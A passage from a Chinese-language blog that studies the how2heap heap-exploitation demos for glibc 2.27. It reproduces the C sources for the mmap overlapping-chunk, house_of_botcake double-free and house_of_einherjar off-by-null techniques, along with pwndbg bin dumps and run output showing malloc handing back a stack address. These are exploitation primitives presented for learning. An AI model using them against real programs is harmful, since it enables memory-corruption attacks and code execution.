mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Size of third mmap chunk: 0x%llx\n\n"</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Change the size of the third mmap chunk to overlap with the second mmap chunk\n"</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This will cause both chunks to be Munmapped and given back to the system\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New size of third mmap chunk: 0x%llx\n"</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Free the third mmap chunk, which munmaps the second and third chunks\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Get a very large chunk from malloc to get mmapped chunk\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This should overlap over the previously munmapped/freed chunks\n"</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk Ptr: %p\n"</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk Ptr Size: 0x%llx\n"</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n"</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Value of index 0 of mmap chunk 2 prior to write: %llx\n"</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Setting the value of the overlapped chunk\n"</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Second chunk value (after write): 0x%llx\n"</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk value: 0x%llx\n\n"</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Boom! The new chunk has been overlapped with a previous mmaped chunk\n"</span>);</span><br><span class="line">	assert(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>此攻击手法和2.23下也是差不多的。分配三个大小0x100000的chunk。布局如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The first mmap chunk goes directly above LibC: <span class="number">0x7ffff7ef3010</span></span><br><span class="line">The second mmap chunk goes below LibC: <span class="number">0x7ffff78e3010</span></span><br><span class="line">The third mmap chunk goes below the second mmap chunk: <span class="number">0x7ffff77e2010</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/15.png"></p>
<p>现在假设有一个漏洞可以改mmap3的size为mmap3 + mmap2，mmap3和mmap2形成了一个overlapping。这个时候释放mmap3，mmap3和mmap2会munmap</p>
<p>但是mmap2还是一个正常的块，申请0x300000大小并写入值就可以看到mmap2那里被覆盖了。</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">This is performing an overlapping chunk attack but on extremely large <span class="title function_">chunks</span> <span class="params">(mmap chunks)</span>.</span><br><span class="line">Extremely large chunks are special because they are allocated in their own mmaped section</span><br><span class="line">of memory, instead of being put onto the normal heap.</span><br><span class="line">=======================================================</span><br><span class="line"></span><br><span class="line">Allocating three extremely large heap chunks of size <span class="number">0x100000</span> </span><br><span class="line"></span><br><span class="line">The first mmap chunk goes directly above LibC: <span class="number">0x7ffff7ef3010</span></span><br><span class="line">The second mmap chunk goes below LibC: <span class="number">0x7ffff78e3010</span></span><br><span class="line">The third mmap chunk goes below the second mmap chunk: <span class="number">0x7ffff77e2010</span></span><br><span class="line"></span><br><span class="line">Current System Memory Layout </span><br><span class="line">================================================</span><br><span class="line">running program</span><br><span class="line">heap</span><br><span class="line">....</span><br><span class="line">third mmap chunk</span><br><span class="line">second mmap chunk</span><br><span class="line">LibC</span><br><span class="line">....</span><br><span class="line">ld</span><br><span class="line">first mmap chunk</span><br><span class="line">===============================================</span><br><span class="line"></span><br><span class="line">Prev Size of third mmap chunk: <span class="number">0x0</span></span><br><span class="line">Size of third mmap chunk: <span class="number">0x101002</span></span><br><span class="line"></span><br><span class="line">Change the size of the third mmap chunk to overlap with the second mmap chunk</span><br><span class="line">This will cause both chunks to be Munmapped and given back to the system</span><br><span class="line">This is where the vulnerability occurs; corrupting the size or prev_size of a chunk</span><br><span class="line">New size of third mmap chunk: <span class="number">0x202002</span></span><br><span class="line">Free the third mmap chunk, which munmaps the second and third chunks</span><br><span class="line"></span><br><span class="line">Get a very large chunk from <span class="built_in">malloc</span> to get mmapped chunk</span><br><span class="line">This should overlap over the previously munmapped/freed chunks</span><br><span class="line">Overlapped chunk Ptr: <span class="number">0x7ffff76e3010</span></span><br><span class="line">Overlapped chunk Ptr Size: <span class="number">0x301002</span></span><br><span class="line">Distance between new chunk and the second mmap <span class="title function_">chunk</span> <span class="params">(which was munmapped)</span>: 0x40000</span><br><span class="line">Value of index 0 of mmap chunk 2 prior to write: 0</span><br><span class="line">Setting the value of the overlapped chunk</span><br><span class="line">Second chunk <span class="title function_">value</span> <span class="params">(after write)</span>: 0x1122334455667788</span><br><span class="line">Overlapped chunk value: 0x1122334455667788</span><br><span class="line"></span><br><span class="line">Boom! The new chunk has been overlapped with a previous mmaped chunk</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-botcake-double-free-1"><a href="#house-of-botcake-double-free-1" class="headerlink" title="house_of_botcake(double free)"></a>house_of_botcake(double free)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This attack only relies on double free.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The address we want malloc() to return, namely,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the target address is %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Preparing heap layout"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++){</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a chunk for later consolidation"</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating the victim chunk."</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100): a=%p.\n"</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we are able to cause chunk overlapping"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: fill up tcache list"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++){</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Launch tcache poisoning"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk"</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"We simply overwrite victim's fwd pointer"</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we can cash out the target chunk."</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The new chunk is at %p\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Got control on target/stack!\n\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Note:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"In that case, once you have done this exploitation, you can have many arbitary writes very easily."</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>此攻击方法适用于程序只存在double free。先申请七个chunk，以便后续填满tcache，为之后的合并申请一个prev chunk。申请用于double free的victim chunk（a)。最后再来一个0x10为了防止与top chunk合并。</p>
<p>现在填满tcache。并将a送入unsortedbin中。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x55555555b8c0</span> —▸ <span class="number">0x55555555b7b0</span> —▸ <span class="number">0x55555555b6a0</span> —▸ <span class="number">0x55555555b590</span> —▸ <span class="number">0x55555555b480</span> —▸ <span class="number">0x55555555b370</span> —▸ <span class="number">0x55555555b260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555bad0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55555555bad0</span></span><br></pre></td></tr></tbody></table></figure>

<p>再将prev给释放，这个时候a和prev合并。我们为了将a送入tcache中，malloc(0x100)再free(a)，也就是从tcache中取走一个，再将a送入tcache中。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x55555555bae0</span> —▸ <span class="number">0x55555555b7b0</span> —▸ <span class="number">0x55555555b6a0</span> —▸ <span class="number">0x55555555b590</span> —▸ <span class="number">0x55555555b480</span> —▸ <span class="number">0x55555555b370</span> —▸ <span class="number">0x55555555b260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555b9c0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55555555b9c0</span></span><br></pre></td></tr></tbody></table></figure>

<p>因为a在unsortedbin中，也在tcache中，所以我们可以malloc一个比0x100大的chunk（会从unsortedbin中取），这个时候可以控制a的fd了就可以实现任意地址申请。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x55555555bae0</span> —▸ <span class="number">0x7fffffffdc50</span> —▸ <span class="number">0x7fffffffdcb8</span> —▸ <span class="number">0x7fffffffdd88</span> —▸ <span class="number">0x7fffffffe130</span></span><br></pre></td></tr></tbody></table></figure>

<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a powerful tcache poisoning attack by tricking <span class="built_in">malloc</span> into</span><br><span class="line">returning a pointer to an arbitrary <span class="title function_">location</span> <span class="params">(in this demo, the <span class="built_in">stack</span>)</span>.</span><br><span class="line">This attack only relies on <span class="type">double</span> <span class="built_in">free</span>.</span><br><span class="line"></span><br><span class="line">The address we want <span class="title function_">malloc</span><span class="params">()</span> to <span class="keyword">return</span>, namely,</span><br><span class="line">the target address is 0x7fffffffdd00.</span><br><span class="line"></span><br><span class="line">Preparing heap layout</span><br><span class="line">Allocating 7 <span class="title function_">chunks</span><span class="params">(<span class="built_in">malloc</span>(<span class="number">0x100</span>))</span> <span class="keyword">for</span> us to fill up tcache <span class="built_in">list</span> later.</span><br><span class="line">Allocating a chunk <span class="keyword">for</span> later consolidation</span><br><span class="line">Allocating the victim chunk.</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(<span class="number">0x100</span>)</span>: a=<span class="number">0x55555555bae0</span>.</span><br><span class="line">Allocating a padding to prevent consolidation.</span><br><span class="line"></span><br><span class="line">Now we are able to cause chunk overlapping</span><br><span class="line">Step <span class="number">1</span>: fill up tcache <span class="built_in">list</span></span><br><span class="line">Step <span class="number">2</span>: <span class="built_in">free</span> the victim chunk so it will be added to unsorted bin</span><br><span class="line">Step <span class="number">3</span>: <span class="built_in">free</span> the previous chunk and make it consolidate with the victim chunk.</span><br><span class="line">Step <span class="number">4</span>: add the victim chunk to tcache <span class="built_in">list</span> by taking one out from it and <span class="built_in">free</span> victim again</span><br><span class="line"></span><br><span class="line">Launch tcache poisoning</span><br><span class="line">Now the victim is contained in a larger freed chunk, we can <span class="keyword">do</span> a simple tcache poisoning by using overlapped chunk</span><br><span class="line">We simply overwrite victim<span class="number">'</span>s fwd pointer</span><br><span class="line">Now we can cash out the target chunk.</span><br><span class="line">The new chunk is at <span class="number">0x7fffffffdd00</span></span><br><span class="line">Got control on target/<span class="built_in">stack</span>!</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">And the wonderful thing about this exploitation is that: you can <span class="built_in">free</span> b, victim again and modify the fwd pointer of victim</span><br><span class="line">In that <span class="keyword">case</span>, once you have done this exploitation, you can have many arbitary writes very easily</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-einherjar-off-by-null-1"><a href="#house-of-einherjar-off-by-null-1" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to House of Einherjar!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 18.04.4 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe allocate 0x38 bytes for 'a'\n"</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"a: %p\n"</span>, a);</span><br><span class="line">   </span><br><span class="line">	<span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a 